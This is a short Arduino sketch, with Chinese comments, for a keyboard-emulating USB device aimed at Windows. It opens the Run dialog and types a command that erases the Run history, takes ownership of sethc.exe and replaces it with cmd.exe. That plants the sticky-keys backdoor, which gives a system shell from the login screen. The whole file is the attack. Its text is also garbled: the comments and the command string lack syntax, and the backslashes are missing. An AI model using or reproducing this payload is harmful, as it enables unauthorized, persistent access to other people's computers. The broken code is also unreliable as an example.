void setup() {初始化
  delay(5000);延时
  Keyboard.press(KEY_LEFT_GUI);win键 
  delay(500); 
  Keyboard.press('r');r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  delay(500); 
  Keyboard.println(CMD C START MIN REG DELETE hkcusOFTWAREmICROSOFTwINDOWScURRENTvERSIONeXPLORERrUNmru F&TAKEOWN F %sYSTEMrOOT%SYSTEM32SETHC.EXE&ECHO YCACLS %sYSTEMrOOT%SYSTEM32SETHC.EXE g %username%f&COPY CWINDOWSSYSTEM32CMD.EXE CWINDOWSSYSTEM32SETHC.EXE y);
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();结束键盘通讯 
}
void loop()循环
{
}